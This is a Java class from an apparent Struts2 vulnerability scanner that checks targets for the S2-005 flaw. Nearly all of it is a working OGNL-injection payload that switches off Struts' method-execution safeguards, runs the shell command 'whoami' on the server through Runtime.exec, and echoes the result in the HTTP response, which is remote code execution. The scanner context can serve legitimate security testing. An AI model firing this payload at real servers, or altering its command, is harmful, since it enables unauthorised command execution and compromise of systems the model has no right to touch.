package com.mtx.xiatian.hacker.struts2Scan;

/**
 * http://struts.apache.org/docs/s2-005.html
 *Possible Mitigation Workaround: Configure ParametersIntercptor in struts.xml to Exclude Malicious Parameters
 */
public class S2_005 extends CheckTools implements IStruts2Scan {
	
	private static String s2_005_POC = "('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(bla)(bla)&('\\u0023mycmd\\u003d\\'whoami\\'')(bla)(bla)&('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)&(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))&(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))&(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))&(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))&('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla))";

	@Override
	public boolean doS2LeakScan(String target) {
		return doS2LeakScan(target, s2_005_POC);
	}

}
